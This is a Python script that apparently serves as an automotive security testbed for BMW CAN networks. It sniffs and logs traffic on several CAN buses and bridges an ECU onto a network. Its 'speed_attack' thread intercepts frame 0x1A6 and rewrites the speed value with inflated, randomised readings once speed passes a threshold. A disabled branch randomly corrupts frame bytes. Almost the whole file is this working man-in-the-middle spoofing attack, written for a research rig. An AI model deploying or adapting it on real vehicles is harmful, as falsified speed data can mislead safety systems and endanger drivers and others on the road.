#!/usr/bin/env python3

# *** Import libraries
import sys
import signal
import queue
from custom_layers.bmw_merged import SignalHeader   # Import custom user functions
from bmw_gui_v10 import gui_start                   # GUI
from datetime import datetime
from can import BLFWriter
from threading import Thread
from scapy.contrib.cansocket import CANSocket
from scapy.layers.can import CAN
from time import sleep, time
from random import randint
from can import rc as can_rc
can_rc['interface'] = 'socketcan_ctypes'

# *** Global variables

# Arrays for GUI
k_ids_array, p_ids_array, f_ids_array = {}, {}, {}
bridge_net_array, bridge_ecu_array = {}, {}
k_raw_pkts, p_raw_pkts, f_raw_pkts = [], [], []

# Display
sniff = False    # set False for no sniffing, i.e. no logging
disp = False     # set False for no display for good latency
pkt_rate = 1     # display packet update rate: every 1 pkt update rate -> spikes about every 100 messages

# Attack - Assume speed Offset rate = * 1.3
speed_offset = 1.35
attack_speed = 40

# *** Classes


class BLFMsg(object):
    def __init__(self):
        self.channel = 0
        self.dlc = 0
        self.arbitration_id: 0
        self.timestamp: 0
        self.id_type = False
        self.is_extended_id = False
        self.is_remote_frame = False
        self.is_fd = False
        self.bitrate_switch = False
        self.error_state_indicator = False
        self.is_error_frame = False


# Initialise Linux CAN Socket - Note BLF_id = id+1
p_soc, p_id, p_rate = 'can_5', 1, 500000        # id=0 (pcan)
f_soc, f_id, f_rate = 'can_4', 2, 500000        # id=1 (fcan)
k_soc, k_id, k_rate = 'can_6', 3, 100000        # id=2 (kcan)
# id=3 (bridge), b_rate depends on which network
b_soc, b_id = 'can_7', 4
d_soc, d_id, d_rate = 'can0', 5, 500000         # id=4 (dcan)

# Open Linux CAN Socket - Note BLF_id = id+1
pcan_socket = CANSocket(channel=p_soc, bitrate=p_rate,
                        receive_own_messages=True)           # pcan
fcan_socket = CANSocket(channel=f_soc, bitrate=f_rate,
                        receive_own_messages=True)           # fcan
kcan_socket = CANSocket(channel=k_soc, bitrate=k_rate,
                        receive_own_messages=True)           # kcan

# Bridge parameters
# PCAN = 'can_5', 0, 500000 / FCAN = 'can_4', 1, 500000 / KCAN = 'can_6', 2, 100000
net_can, net_id, net_br = p_soc, p_id, p_rate
# net_can, net_id, net_br = k_soc, k_id, k_rate     # PCAN = 'can_5', 0, 500000 / FCAN = 'can_4', 1, 500000 / KCAN = 'can_6', 2, 100000
# always can_7 and 3, except br = 500000 for PCAN and FCAN, br = 100000 for KCAN
bridge_can, bridge_id, bridge_br = b_soc, b_id, net_br
bridge_net_socket = CANSocket(
    channel=net_can, bitrate=net_br, receive_own_messages=False)
bridge_ecu_socket = CANSocket(
    channel=bridge_can, bitrate=bridge_br, receive_own_messages=False)

# *** Define signal handler to stop this program


def signal_handler(sig, frame):

    print('\nYou pressed Ctrl+C!')

    if sniff:
        # Clear queues
        q_cm.join()
        q_cn.join()
        q_ce.join()

        # Stop writer
        writer_cm.stop()
        writer_ce.stop()
        writer_cn.stop()

        print("Sniffer stopped")
    sys.exit(0)                                 # End program

# *** Define workers for queue - writetofile


def worker_cm():
    msg = BLFMsg()
    while True:
        [p_id, p_time, p_len, p_data, can_nbr] = q_cm.get()
        msg.channel = can_nbr
        msg.arbitration_id = p_id
        msg.timestamp = p_time
        msg.dlc = p_len
        msg.data = p_data
        writer_cm.on_message_received(msg)
        q_cm.task_done()


def worker_cn():
    msg = BLFMsg()
    while True:
        [p_id, p_time, p_len, p_data, can_nbr] = q_cn.get()
        msg.channel = can_nbr
        msg.arbitration_id = p_id
        msg.timestamp = p_time
        msg.dlc = p_len
        msg.data = p_data
        writer_cn.on_message_received(msg)
        q_cn.task_done()


def worker_ce():
    msg = BLFMsg()
    while True:
        [p_id, p_time, p_len, p_data, can_nbr] = q_ce.get()
        msg.channel = can_nbr
        msg.arbitration_id = p_id
        msg.timestamp = p_time
        msg.dlc = p_len
        msg.data = p_data
        writer_ce.on_message_received(msg)
        q_ce.task_done()

# *** Panel display


def msg_display(pkt, ids_array, raw_pkts, pkt_counter):

    # Try to decoded CAN frame from generated DBC layer (bmw_merged.py)
    decoded_pkt = SignalHeader(bytes(pkt))

    # Fill IDs array (ids_array)
    if pkt.identifier not in ids_array:
        ids_array[pkt.identifier] = [
            decoded_pkt.summary(), decoded_pkt, pkt, 1]
    else:
        count = ids_array[pkt.identifier][3]
        ids_array[pkt.identifier] = [
            decoded_pkt.summary(), decoded_pkt, pkt, count + 1]

    # Fill temporary array of packets, limit to 18 (raw_pkts_array)
    raw_pkts.append([pkt_counter, pkt.identifier, bytes(pkt)])
    if len(raw_pkts) > 18:
        raw_pkts.pop(0)

# *** Sniffers


def p_sniffer():
    pcan_counter = 0
    while True:
        # Receive can frame
        pkt = pcan_socket.recv()
        q_cm.put_nowait([pkt.identifier, pkt.time, pkt.length, pkt.data, p_id])
        pcan_counter += 1                                       # Increase packet counter
        if pcan_counter % pkt_rate == 0 and disp:  # Setting for update every pkt
            msg_display(pkt, p_ids_array, p_raw_pkts, pcan_counter)


def f_sniffer():
    fcan_counter = 0
    while True:
        # Receive can frame
        pkt = fcan_socket.recv()
        q_cm.put_nowait([pkt.identifier, pkt.time, pkt.length, pkt.data, f_id])
        fcan_counter += 1                                       # Increase packet counter
        if fcan_counter % pkt_rate == 0 and disp:  # Setting for update every pkt
            msg_display(pkt, f_ids_array, f_raw_pkts, fcan_counter)


def k_sniffer():
    kcan_counter = 0
    while True:
        # Receive can frame
        pkt = kcan_socket.recv()
        q_cm.put_nowait([pkt.identifier, pkt.time, pkt.length, pkt.data, k_id])
        kcan_counter += 1                                       # Increase packet counter
        if kcan_counter % pkt_rate == 0 and disp:  # Setting for update every pkt
            msg_display(pkt, k_ids_array, k_raw_pkts, kcan_counter)

# *** Define Bridging thread for network


def speed_attack():

    pkt_counter = 0
    counter_old = -1

    while True:

        # ======== in_can =========
        # Receive can frame
        pkt = bridge_ecu_socket.recv()

        # ======== out_can =========
        # Send can frame
        if (pkt.identifier == 0x1A6) or (pkt.identifier == 0x1A0) or (pkt.identifier == 0xCE):

            # Increase packet counter
            pkt_counter += 1

            if sniff:
                # write orginal pkt to file
                q_cn.put_nowait([pkt.identifier, pkt.time,
                                pkt.length, pkt.data, bridge_id])

            if (pkt.identifier == 0x1A6):
                # Change the packet, if speed above attack_speed
                decoded_pkt = SignalHeader(bytes(pkt))
                pkt_fields = decoded_pkt.payload.fields
                if counter_old == -1:
                    counter_old = pkt_fields['Counter']
                    last_speed_value = pkt_fields['SpeedValue']
                    speed_value_mod = last_speed_value
                    last_speed_value_mod = last_speed_value
                    overflow_cnt = pkt_fields['overflow_counter']
                    speed = 0
                    counter = counter_old
                    overflow_cnt_mod = overflow_cnt
                else:
                    speed_value = pkt_fields['SpeedValue']
                    counter = pkt_fields['Counter']
                    overflow_cnt = pkt_fields['overflow_counter']
                    if (speed_value == 4095 and counter == 15) or (speed_value == 0 and counter == 0):
                        last_speed_value_mod = speed_value
                        overflow_cnt_mod = overflow_cnt
                    else:
                        if counter != counter_old:
                            counter_diff = counter - counter_old
                            if counter_diff < 0:
                                counter_diff += 4096
                            s_speed = (speed_value - last_speed_value)
                            if s_speed < 0:
                                s_speed += 4096
                            speed = (s_speed * 400) / \
                                (counter_diff * speed_offset)
                            if speed > attack_speed:
                                # fake speed (+ random speed)
                                speed = speed + randint(-40, 100)
                                s_speed = (speed * counter_diff *
                                           speed_offset) / 400
                            speed_value_mod = int(
                                s_speed + last_speed_value_mod)
                            if speed_value_mod > 4095:
                                speed_value_mod -= 4096
                                overflow_cnt_mod = (overflow_cnt_mod+1) % 16
                            pkt_fields['SpeedValue'] = speed_value_mod
                            pkt_fields['overflow_counter'] = overflow_cnt_mod
                            pkt = CAN(bytes(decoded_pkt))
                            last_speed_value_mod = speed_value_mod
                    counter_old = counter
                    last_speed_value = speed_value
                    print(counter, speed, overflow_cnt, overflow_cnt_mod)

            # Send packet via bridge
            pkt.time = time()
            bridge_net_socket.send(pkt)

            if sniff:
                # Write modified pkt to file
                q_cn.put_nowait([pkt.identifier, pkt.time,
                                pkt.length, pkt.data, net_id])

            if pkt_counter % pkt_rate == 0 and disp:  # Setting for update every pkt
                # Try to decoded CAN frame from generated DBC layer (bmw_merged.py)
                decoded_pkt = SignalHeader(bytes(pkt))

                # Fill IDs array (ids_array)
                if pkt.identifier not in bridge_net_array:
                    bridge_net_array[pkt.identifier] = [
                        decoded_pkt.summary(), decoded_pkt, pkt, 1]
                else:
                    count = bridge_net_array[pkt.identifier][3]
                    bridge_net_array[pkt.identifier] = [
                        decoded_pkt.summary(), decoded_pkt, pkt, count + 1]

        else:                               # PASSTHRU: Send orginal frame
            bridge_net_socket.send(pkt)
            pass

# *** Define Bridging thread for ECUs


def bridge_ecu():

    pkt_counter = 0

    while True:

        # ======== in_can =========
        # Receive can frame
        pkt = bridge_net_socket.recv()

        # ======== out_can =========
        # Send can frame
        # if (pkt.identifier==0x130):
        if False:   # True

            # Increase packet counter
            pkt_counter += 1

            if sniff:
                # write orginal pkt to file
                q_ce.put_nowait([pkt.identifier, pkt.time,
                                pkt.length, pkt.data, net_id])

            # Change the packet, if any
            if False:  # True:
                d = bytearray(pkt.data)
                d_len = len(d)
                sel_d = randint(0, d_len-1)
                d[sel_d] = randint(0, 255)
                pkt.data = d
            # pkt.time = time() - pkt.time
            pkt.time = time()

            # Send packet via bridge
            bridge_ecu_socket.send(pkt)

            if sniff:
                # Write modified pkt to file
                q_ce.put_nowait([pkt.identifier, pkt.time,
                                pkt.length, pkt.data, bridge_id])

            if pkt_counter % pkt_rate == 0 and disp:  # Setting for update every pkt
                # Try to decoded CAN frame from generated DBC layer (bmw_merged.py)
                decoded_pkt = SignalHeader(bytes(pkt))

                # Fill IDs array (ids_array)
                if pkt.identifier not in bridge_ecu_array:
                    bridge_ecu_array[pkt.identifier] = [
                        decoded_pkt.summary(), decoded_pkt, pkt, 1]
                else:
                    count = bridge_ecu_array[pkt.identifier][3]
                    bridge_ecu_array[pkt.identifier] = [
                        decoded_pkt.summary(), decoded_pkt, pkt, count + 1]

        else:  # ========== PASSTHRU: Send orginal frame ==========
            bridge_ecu_socket.send(pkt)
            pass


# **** Main Program ***

# Install signal for program exit
signal.signal(signal.SIGINT, signal_handler)

try:

    # GUI interface Comment out if need for good latency
    if disp:
        gui_start(k_ids_array, p_ids_array, f_ids_array, k_raw_pkts,
                  p_raw_pkts, f_raw_pkts, bridge_net_array, bridge_ecu_array)

    if sniff:
        # logging files name
        now = datetime.now()
        date_time = now.strftime("%Y%m%d%H%M")
        dataFolder = './data/'
        cmFile = dataFolder+'cm'+date_time+'.blf'
        cnFile = dataFolder+'cn'+date_time+'.blf'
        ceFile = dataFolder+'ce'+date_time+'.blf'

        # Initialise BLF writer
        writer_cm = BLFWriter(cmFile)
        writer_cn = BLFWriter(cnFile)
        writer_ce = BLFWriter(ceFile)
        writer_cm.start_timestamp = 0
        writer_cn.start_timestamp = 0
        writer_ce.start_timestamp = 0
        writer_cm.COMPRESSION_LEVEL = 9
        writer_cn.COMPRESSION_LEVEL = 9
        writer_ce.COMPRESSION_LEVEL = 9

        # Initialise queue to write to file
        q_cm = queue.Queue()
        q_cn = queue.Queue()
        q_ce = queue.Queue()

        # # Turn-on the workers thread to write to file
        Thread(target=worker_cm, daemon=True).start()
        Thread(target=worker_cn, daemon=True).start()
        Thread(target=worker_ce, daemon=True).start()

        # # Start sniffer thread
        Thread(target=p_sniffer, daemon=True).start()
        Thread(target=f_sniffer, daemon=True).start()
        Thread(target=k_sniffer, daemon=True).start()

    # Start speed_attack
    Thread(target=speed_attack, daemon=True).start()

    # Start bridge_ecu
    Thread(target=bridge_ecu, daemon=True).start()

    while True:
        sleep(50000)

except KeyboardInterrupt:
    print("\nSniffer stopped")
